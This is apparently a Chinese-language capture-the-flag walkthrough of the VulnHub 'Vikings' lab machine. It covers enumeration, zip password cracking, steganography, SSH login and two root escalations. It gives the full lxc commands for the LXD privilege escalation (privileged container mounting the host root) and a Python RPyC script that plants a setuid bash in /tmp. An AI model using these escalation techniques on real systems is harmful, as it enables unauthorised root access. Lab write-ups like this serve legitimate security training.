1.靶机介绍

靶机下载地址：https://www.vulnhub.com/entry/vikings-1,741/
靶机提示：
Description
A CTF machine with full of challenges
Do what is visible, no rabbit holes
Learn new things, and make sure that you enum first then hack.
Discord- luckythandel#6053 {for any-hint}
靶机IP：10.8.1.145

2.端口发现

扫描靶机信息，发现开放了22、25、80、110端口，25和110应该都无法利用，先看80端口吧

3.WEB访问

访问80

点击site进入网站，没有可利用的

4.目录扫描

目录扫描，只有gobuster扫描到一个war.txt

访问/site/war.txt，提示一个/war-is-over

访问/site/war-is-over/

5.解密

解密输出的文件竟然是一个zip


vim查看一下文件PK开头的，用file查看下文件，提示是Zip类型的文件，使用了AES加密


使用fcrackzip解密失败，尝试zip2john 1 > test将密文密码提取出来，然后用john解密，得到密码ragnarok123

解压出来是一张图片，考虑到隐写

6.隐写破解

用steghide提取数据提示有密码，用stegseek没有破解出来


使用binwalk尝试分离下文件

分离出2个文件，解压缩内的文件也是user，查看user，vinkings是靶机的名称，那么这个形式有点像ssh登录，并且靶机也开放了22端口，尝试一下吧


7.SSH登录

尝试用FamousBoatbuilder_floki登录失败，最后利用floki和密码f@m0usboatbuilde7成功登录了ssh

习惯性sudo -l，没有sudo权限，查看当前目录下的readme.txt，说了一堆，提示了需要boat找到Ragnar，目录下正好有个boat，那Ragnar是不是就是用户名，那就是利用boat找到Ragnar用户

查看/etc/passwd，发现了ragnar用户，思路是对的

先去ragnar目录下看看，查看到一个flag：4bf930187d0149a9e4374a4e823f867d，查看其他文件，没什么可用信息

id看一下，居然有lxd，lxd可以利用尝试一下

8.LXD提权

查找一下lxd的exp，有一个46978.sh，下载到本地看一下


查看脚本，提示需要进行四步

Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]

Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]


Step 3: Run this script and you will get root [Victim Machine]
将生成的镜像文件alpine-v3.15-x86_64-20220430_1141.tar.gz传到靶机/tmp下，赋权


lxc image import ./alpine-v3.15-x86_64-20220430_1141.tar.gz --alias vik导入镜像，lxc image list查看镜像列表

这里没有存储池，所以需要重新建一个名字为vks的存储池，建议Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: dir 这里选择dir，Would you like to create a new local network bridge? (yes/no) [default=yes]: no这里选择no，不创建新的本地桥接

依次执行：
lxc init vik vks -c security.privileged=true
lxc config device add vks vik disk source=/ path=/mnt/root recursive=true
lxc start vks
lxc exec vks /bin/sh

Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
进入所有的目录都需要先导航到/mnt/root/才可以，进入/mnt/root/root目录，拿到flag：f0b98d4387ff6da77317e582da98bf31！！！

9.方法二

查看boat，boat文件中说的是 collatz-conjecture （考拉兹猜想），又称为3n＋1猜想等，是指对于每一个正整数，如果它是奇数，则对它乘3再加1，如果它是偶数，则对它除以2，如此循环，最终都能够得到1。如n = 6，根据上述数式，得出 6→3→10→5→16→8→4→2→1。boat 中的意思是求第 29 个素数的 collatz-conjecture 结果，然后要对num这个数字进行考拉兹猜想。

网上搜索了一下29 prime-number，查到结果是109
https://g.vovososo.com/search?q=29+prime-number

得出代码如下：
def collatz(x):
result = [109]
while x != 1:
if x % 2 == 1:
x = (3 * x) + 1
else:
x = (x / 2)
if x <= 255:
result.append(int(x))
return result
print(collatz(109))

执行代码，得到以下数字

对数字进行10进制转换字符串，得到长度为1的值，https://gchq.github.io/CyberChef/打不开，随便找了个网站试了下，把乱码删除得到mR)|>^/Gky[gz=.F#j5P(，试一下行不行吧

切换ragnar用户，输入密码mR)|>^/Gky[gz=.F#j5P(成功登录。

升级下shell，继续信息收集，发现了2个端口在监听

上网查询到18812是RPyC服务器监听端口，之前查看ragnar用户下文件时好像看到一个关于rpyc的代码，去ragnar下翻看一下

查到可以利用rpyc远程操纵，尝试利用获得root权限

在目录下的.profile下找到了rpyc的位置

写个脚本自动连接，然后把root权限的bash复制给我们使用
import rpyc
connect = rpyc.classic.connect('localhost')
def rootsh():
import os
os.system('rm /tmp/rootsh')
os.system('cp /bin/bash /tmp/rootsh && chmod +s /tmp/rootsh')

conn = connect.teleport(rootsh)
conn()

运行脚本，在/tmp下生成了rootsh文件

运行，拿到flag！！！
